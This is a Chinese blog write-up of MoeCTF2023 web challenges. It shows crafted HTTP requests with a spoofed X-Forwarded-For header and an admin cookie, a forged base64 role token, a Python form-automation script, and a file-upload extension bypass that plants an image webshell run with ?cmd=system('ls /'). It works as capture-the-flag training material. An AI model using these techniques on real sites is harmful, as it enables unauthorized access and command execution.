<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="Hsad"><meta name="copyright" content="Hsad"><meta name="generator" content="Hexo 7.2.0"><meta name="theme" content="hexo-theme-yun"><title>Hsad's Blog</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
  [".post-card",".markdown-body img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
}
document.addEventListener("DOMContentLoaded", initScrollReveal);
document.addEventListener("pjax:success", initScrollReveal);
</script><link rel="icon" type="image/png" href="/favicon.ico"><link rel="mask-icon" href="/favicon.ico" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
    window.Yun = {}
    window.CONFIG = {"hostname":"hsad.xyz","root":"/","title":"所以你弃权","version":"1.10.11","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"fireworks":{"colors":null},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/hexo-theme-yun.js" type="module"></script><meta name="description" content="写的不好各位师傅见谅 HTTPCHALLENGE: httpDESCRIPTION: 听说这个http里还有个什么东西叫饼干，也不知道是不是吃的 根据题目描述，貌似和数据包有关系使用代理软件连接节点访问发现按照要求提交参数即可获得  POST &#x2F;?UwU&#x3D;u HTTP&#x2F;1.1 Host: localhost:64168 Cache-Control: max-age&#x3D;0 sec-ch-ua: &quot;Ch">
<meta property="og:type" content="article">
<meta property="og:title" content="Hsad&#39;s Blog">
<meta property="og:url" content="https://hsad.xyz/2024/07/16/MoeCTF2023-web/MoeCTF2023-web-TT/index.html">
<meta property="og:site_name" content="Hsad&#39;s Blog">
<meta property="og:description" content="写的不好各位师傅见谅 HTTPCHALLENGE: httpDESCRIPTION: 听说这个http里还有个什么东西叫饼干，也不知道是不是吃的 根据题目描述，貌似和数据包有关系使用代理软件连接节点访问发现按照要求提交参数即可获得  POST &#x2F;?UwU&#x3D;u HTTP&#x2F;1.1 Host: localhost:64168 Cache-Control: max-age&#x3D;0 sec-ch-ua: &quot;Ch">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907111357690.png">
<meta property="og:image" content="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907151259825.png">
<meta property="og:image" content="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907151709517.png">
<meta property="og:image" content="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907152055953.png">
<meta property="og:image" content="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907152326552.png">
<meta property="og:image" content="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907152633221.png">
<meta property="og:image" content="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907153346433.png">
<meta property="og:image" content="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907153530460.png">
<meta property="og:image" content="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907153929231.png">
<meta property="og:image" content="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907154510412.png">
<meta property="og:image" content="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907154700645.png">
<meta property="og:image" content="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907155030664.png">
<meta property="og:image" content="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907155156281.png">
<meta property="og:image" content="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907155632658.png">
<meta property="og:image" content="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907160340776.png">
<meta property="og:image" content="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907160551761.png">
<meta property="og:image" content="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907162316680.png">
<meta property="og:image" content="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907210222817.png">
<meta property="og:image" content="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230922215913893.png">
<meta property="og:image" content="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230922220234166.png">
<meta property="og:image" content="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230922222050154.png">
<meta property="og:image" content="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230922222659454.png">
<meta property="og:image" content="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923142853852.png">
<meta property="og:image" content="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923143402274.png">
<meta property="og:image" content="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923143843592.png">
<meta property="og:image" content="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923144108060.png">
<meta property="og:image" content="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923144614869.png">
<meta property="og:image" content="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923145032369.png">
<meta property="og:image" content="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923145238948.png">
<meta property="og:image" content="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923145730806.png">
<meta property="og:image" content="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923160506306.png">
<meta property="og:image" content="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923160820637.png">
<meta property="og:image" content="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923162650038.png">
<meta property="og:image" content="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923163217649.png">
<meta property="article:published_time" content="2024-07-16T09:19:05.121Z">
<meta property="article:modified_time" content="2024-07-14T06:17:05.911Z">
<meta property="article:author" content="Hsad">
<meta property="article:tag" content="生活">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907111357690.png"><script>(function() {
  if (CONFIG.mode !== 'auto') return
  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
  const setting = localStorage.getItem('darken-mode') || 'auto'
  if (setting === 'dark' || (prefersDark && setting !== 'light'))
    document.documentElement.classList.toggle('dark', true)
})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
IconifyProviders = {
  // Empty prefix: overwrite default API provider configuration
  '': {
    // Use custom API first, use Iconify public API as backup
    resources: [
        'https://api.iconify.design',
    ],
    // Wait for 1 second before switching API hosts
    rotate: 1000,
  },
};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="Hsad"><img width="96" loading="lazy" src="/images/avatar.jpg" alt="Hsad"><span class="site-author-status" title="凉">☺️</span></a><div class="site-author-name"><a href="/about/">Hsad</a></div><span class="site-name">Hsad's Blog</span><sub class="site-subtitle">一个人的世界</sub><div class="site-description">翻着我们的照片 想念若隐若现</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">13</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">4</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">14</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:settings-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://qm.qq.com/cgi-bin/qm/qr?k=EYiK7-b5ur1mWxbX7aV2AEBsuoW9c732" title="QQ" target="_blank" style="color:orange"><span class="icon iconify" data-icon="ri:qq-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/watanabe-hsad" title="GitHub" target="_blank" style="color:#181717"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:dubian.zzy@outlook.com" title="E-Mail" target="_blank" style="color:#8E71C1"><span class="icon iconify" data-icon="ri:mail-line"></span></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#HTTP"><span class="toc-number">1.</span> <span class="toc-text">HTTP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web%E5%85%A5%E9%97%A8%E6%8C%87%E5%8C%97"><span class="toc-number">2.</span> <span class="toc-text">Web入门指北</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BD%BC%E5%B2%B8%E7%9A%84flag"><span class="toc-number">3.</span> <span class="toc-text">彼岸的flag</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#cookie"><span class="toc-number">4.</span> <span class="toc-text">cookie</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#gas-gas-gas"><span class="toc-number">5.</span> <span class="toc-text">gas!gas!gas!</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#moe%E5%9B%BE%E5%BA%8A"><span class="toc-number">6.</span> <span class="toc-text">moe图床</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%A7%A3%E4%BD%A0%E7%9A%84%E5%BA%A7%E9%A9%BE"><span class="toc-number">7.</span> <span class="toc-text">解你的座驾</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A4%A7%E6%B5%B7%E6%8D%9E%E9%92%88"><span class="toc-number">8.</span> <span class="toc-text">大海捞针</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#meo%E5%9B%BE%E5%BA%8A"><span class="toc-number">9.</span> <span class="toc-text">meo图床</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A4%BA%E5%91%BD%E5%8D%81%E4%B8%89%E6%9E%AA"><span class="toc-number">10.</span> <span class="toc-text">夺命十三枪</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#signin"><span class="toc-number">11.</span> <span class="toc-text">signin</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%87%BA%E5%8E%BB%E6%97%85%E6%B8%B8%E7%9A%84%E5%BF%83%E6%B5%B7"><span class="toc-number">12.</span> <span class="toc-text">出去旅游的心海</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#moeworld"><span class="toc-number">13.</span> <span class="toc-text">moeworld</span></a></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="https://hsad.xyz/2024/07/16/MoeCTF2023-web/MoeCTF2023-web-TT/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="Hsad"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="Hsad's Blog"></span><header class="post-header"><h1 class="post-title" itemprop="name headline"></h1><div class="post-meta"><div class="post-time"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="创建时间：2024-07-16 17:19:05" itemprop="dateCreated datePublished" datetime="2024-07-16T17:19:05+08:00">2024-07-16</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-2-line"></span></span> <time title="修改时间：2024-07-14 14:17:05" itemprop="dateModified" datetime="2024-07-14T14:17:05+08:00">2024-07-14</time></div><div class="post-classify"></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><p><strong>写的不好各位师傅见谅</strong></p>
<h1 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h1><p>CHALLENGE: http<br>DESCRIPTION: 听说这个http里还有个什么东西叫饼干，也不知道是不是吃的</p>
<p>根据题目描述，貌似和数据包有关系使用代理软件连接节点访问发现按照要求提交参数即可获得</p>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907111357690.png" alt="image-20230907111357690" loading="lazy"></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">POST /?UwU<span class="token operator">=</span>u HTTP/1.1
Host: localhost:64168
Cache-Control: max-age<span class="token operator">=</span><span class="token number">0</span>
sec-ch-ua: <span class="token string">"Chromium"</span><span class="token punctuation">;</span><span class="token assign-left variable">v</span><span class="token operator">=</span><span class="token string">"109"</span>, <span class="token string">"Not_A Brand"</span><span class="token punctuation">;</span><span class="token assign-left variable">v</span><span class="token operator">=</span><span class="token string">"99"</span>
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: <span class="token string">"Windows"</span>
Upgrade-Insecure-Requests: <span class="token number">1</span>
User-Agent: MoeBrowser
Accept: text/html,application/xhtml+xml,application/xml<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span>,image/avif,image/webp,image/apng,*/*<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.8</span>,application/signed-exchange<span class="token punctuation">;</span><span class="token assign-left variable">v</span><span class="token operator">=</span>b3<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span>
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
X-Forwarded-For:127.0.0.1
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span>
Cookie: <span class="token assign-left variable">character</span><span class="token operator">=</span>admin
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: <span class="token number">5</span>

<span class="token assign-left variable">Luv</span><span class="token operator">=</span>u</code></pre>

<p>按照要求提交参数即可</p>
<h1 id="Web入门指北"><a href="#Web入门指北" class="headerlink" title="Web入门指北"></a>Web入门指北</h1><p>解出PDF编码即可</p>
<h1 id="彼岸的flag"><a href="#彼岸的flag" class="headerlink" title="彼岸的flag"></a>彼岸的flag</h1><p>CHALLENGE: 彼岸的flag<br>DESCRIPTION: 我们在某个平行宇宙中得到了一段moectf群的聊天记录，粗心的出题人在这个聊天平台不小心泄露了自己的flag</p>
<p><strong>打开可见一个聊天页面</strong></p>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907151259825.png" alt="image-20230907151259825" loading="lazy"></p>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907151709517.png" alt="image-20230907151709517" loading="lazy"></p>
<h1 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h1><p>CHALLENGE: cookie<br>DESCRIPTION: <strong>本题无需扫描器&#x2F;爆破</strong><br>hint: readme只是一个样例，不是拿来复制的</p>
<p>根据题目给出的附件大致意思需要注册用户来登录获取flag</p>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907152055953.png" alt="image-20230907152055953" loading="lazy"></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">POST /register HTTP/1.1
Host: localhost:62915
sec-ch-ua: <span class="token string">"Chromium"</span><span class="token punctuation">;</span><span class="token assign-left variable">v</span><span class="token operator">=</span><span class="token string">"109"</span>, <span class="token string">"Not_A Brand"</span><span class="token punctuation">;</span><span class="token assign-left variable">v</span><span class="token operator">=</span><span class="token string">"99"</span>
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: <span class="token string">"Windows"</span>
Upgrade-Insecure-Requests: <span class="token number">1</span>
User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT <span class="token number">10.0</span><span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">)</span> AppleWebKit/537.36 <span class="token punctuation">(</span>KHTML, like Gecko<span class="token punctuation">)</span> Chrome/109.0.5414.120 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span>,image/avif,image/webp,image/apng,*/*<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.8</span>,application/signed-exchange<span class="token punctuation">;</span><span class="token assign-left variable">v</span><span class="token operator">=</span>b3<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span>
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span>
Cookie: <span class="token assign-left variable">character</span><span class="token operator">=</span>guest
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: <span class="token number">0</span>

<span class="token punctuation">&#123;</span>
    <span class="token string">"username"</span><span class="token builtin class-name">:</span><span class="token string">"abc"</span>,
    <span class="token string">"password"</span><span class="token builtin class-name">:</span><span class="token string">"123456"</span>
<span class="token punctuation">&#125;</span></code></pre>

<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907152326552.png" alt="image-20230907152326552" loading="lazy"></p>
<p>访问登录接口使用注册的账号进行登录可发现存在token</p>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907152633221.png" alt="image-20230907152633221" loading="lazy"></p>
<pre class="language-none"><code class="language-none">eyJ1c2VybmFtZSI6ICJhYmMiLCAicGFzc3dvcmQiOiAiMTIzNDU2IiwgInJvbGUiOiAidXNlciJ9

&#123;&quot;username&quot;: &quot;abc&quot;, &quot;password&quot;: &quot;123456&quot;, &quot;role&quot;: &quot;user&quot;&#125;

base64</code></pre>

<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907153346433.png" alt="image-20230907153346433" loading="lazy"></p>
<pre class="language-none"><code class="language-none">更改token即可
eyJ1c2VybmFtZSI6ICJhYmMiLCAicGFzc3dvcmQiOiAiMTIzNDU2IiwgInJvbGUiOiAiYWRtaW4ifQ&#x3D;&#x3D;
&#123;&quot;username&quot;: &quot;abc&quot;, &quot;password&quot;: &quot;123456&quot;, &quot;role&quot;: &quot;admin&quot;&#125;
base64编码</code></pre>

<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907153530460.png" alt="image-20230907153530460" loading="lazy"></p>
<h1 id="gas-gas-gas"><a href="#gas-gas-gas" class="headerlink" title="gas!gas!gas!"></a>gas!gas!gas!</h1><p>CHALLENGE: gas!gas!gas!<br>DESCRIPTION: Klutton这个假期信心满满地准备把驾照拿下，于是他仔细地学习了好多漂移视频，还准备了这么一个赛博赛车场；诶，不对，开车好像不是用键盘开的？</p>
<p>打开题目需要连续对坚持五伦</p>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907153929231.png" alt="image-20230907153929231" loading="lazy"></p>
<p>查看源码发现存在如下片段</p>
<pre class="language-HTML" data-language="HTML"><code class="language-HTML">&lt;form action&#x3D;&quot;&#x2F;&quot; method&#x3D;&quot;POST&quot;&gt;
   &lt;label for&#x3D;&quot;driver&quot;&gt;选手:&lt;&#x2F;label&gt;
   &lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;driver&quot; name&#x3D;&quot;driver&quot; required&gt;&lt;br&gt;&lt;br&gt;
   
   &lt;label for&#x3D;&quot;steering_control&quot;&gt;方向控制:&lt;&#x2F;label&gt;
   &lt;select id&#x3D;&quot;steering_control&quot; name&#x3D;&quot;steering_control&quot; required&gt;
     &lt;option value&#x3D;&quot;-1&quot;&gt;左&lt;&#x2F;option&gt;
     &lt;option value&#x3D;&quot;0&quot; selected&gt;直行&lt;&#x2F;option&gt;
     &lt;option value&#x3D;&quot;1&quot;&gt;右&lt;&#x2F;option&gt;
   &lt;&#x2F;select&gt;&lt;br&gt;&lt;br&gt;

   &lt;label for&#x3D;&quot;throttle&quot;&gt;油门控制:&lt;&#x2F;label&gt;
   &lt;select id&#x3D;&quot;throttle&quot; name&#x3D;&quot;throttle&quot; required&gt;
     &lt;option value&#x3D;&quot;0&quot;&gt;松开&lt;&#x2F;option&gt;
     &lt;option value&#x3D;&quot;1&quot;&gt;保持&lt;&#x2F;option&gt;
     &lt;option value&#x3D;&quot;2&quot; selected&gt;全开&lt;&#x2F;option&gt;
   &lt;&#x2F;select&gt;&lt;br&gt;&lt;br&gt;
   
   &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;提交&quot;&gt;
 &lt;&#x2F;form&gt;</code></pre>

<p>根据这些信息编写脚本即可</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> re
url <span class="token operator">=</span> <span class="token string">'http://localhost:64461/'</span>
headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"Content-Type"</span><span class="token punctuation">:</span><span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">&#125;</span>
s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
req_post <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>
    url<span class="token operator">=</span>url<span class="token punctuation">,</span>
    data<span class="token operator">=</span><span class="token string">'driver=q1&amp;steering_control=0&amp;throttle=2'</span><span class="token punctuation">,</span>
    headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'cookies = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>s<span class="token punctuation">.</span>cookies<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
post_data <span class="token operator">=</span> <span class="token string">'driver=q1jun&amp;steering_control=0&amp;throttle=2'</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r'&lt;h3>&lt;font color="red">(.*)&lt;/font>&lt;/h3>&lt;/div>'</span><span class="token punctuation">,</span>req_post<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
req <span class="token operator">=</span> req_post<span class="token punctuation">.</span>text
steering_control <span class="token operator">=</span> <span class="token number">0</span>
throttle <span class="token operator">=</span> <span class="token number">0</span>
<span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token string">'弯道向左'</span> <span class="token keyword">in</span> req_post<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
        steering_control <span class="token operator">=</span> <span class="token number">1</span>
    <span class="token keyword">if</span> <span class="token string">'弯道向右'</span> <span class="token keyword">in</span> req_post<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
        steering_control <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span>
    <span class="token keyword">if</span> <span class="token string">'弯道直行'</span> <span class="token keyword">in</span> req_post<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
        steering_control <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">if</span> <span class="token string">'保持这个速度'</span> <span class="token keyword">in</span> req_post<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
        throttle <span class="token operator">=</span> <span class="token number">1</span>
    <span class="token keyword">if</span> <span class="token string">'抓地力太大了'</span> <span class="token keyword">in</span> req_post<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
        throttle <span class="token operator">=</span> <span class="token number">2</span>
    <span class="token keyword">if</span> <span class="token string">'抓地力太小了'</span> <span class="token keyword">in</span> req_post<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
        throttle <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>steering_control <span class="token operator">=</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>throttle <span class="token operator">=</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
    req_post <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>
        url<span class="token operator">=</span>url<span class="token punctuation">,</span>
        data<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f'driver=q1&amp;steering_control=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>steering_control<span class="token punctuation">&#125;</span></span><span class="token string">&amp;throttle=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>throttle<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">,</span>
        headers<span class="token operator">=</span>headers
    <span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>req_post<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
    <span class="token comment"># print(re.findall(r'&lt;h3>&lt;font color="red">(.*)&lt;/font>&lt;/h3>&lt;/div>',req_post.text)[0])</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'cookies = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>s<span class="token punctuation">.</span>cookies<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span></code></pre>

<h1 id="moe图床"><a href="#moe图床" class="headerlink" title="moe图床"></a>moe图床</h1><p>CHALLENGE: moe图床<br>DESCRIPTION: 我们准备了一个moe图床用于上传一些图片</p>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907154510412.png" alt="image-20230907154510412" loading="lazy"></p>
<p>正常的图片没啥问题，php就无法进行上传</p>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907154700645.png" alt="image-20230907154700645" loading="lazy"></p>
<p>审计js源码发现用点分隔后缀名字多加一个点就把前一个点进行了绕过</p>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907155030664.png" alt="image-20230907155030664" loading="lazy"></p>
<p>图片🐎可成功上传</p>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907155156281.png" alt="image-20230907155156281" loading="lazy"></p>
<p>执行命令即可</p>
<pre class="language-none"><code class="language-none">?cmd&#x3D;system(%27ls%20&#x2F;%27);</code></pre>

<h1 id="解你的座驾"><a href="#解你的座驾" class="headerlink" title="解你的座驾"></a>解你的座驾</h1><p>CHALLENGE: 了解你的座驾<br>DESCRIPTION: 为了极致地漂移，我们准备了一个网站用于查找你喜欢的车车；听说flag也放在里面了，不过不在网站目录放在根目录应该没问题的吧。。。</p>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907155632658.png" alt="image-20230907155632658" loading="lazy"></p>
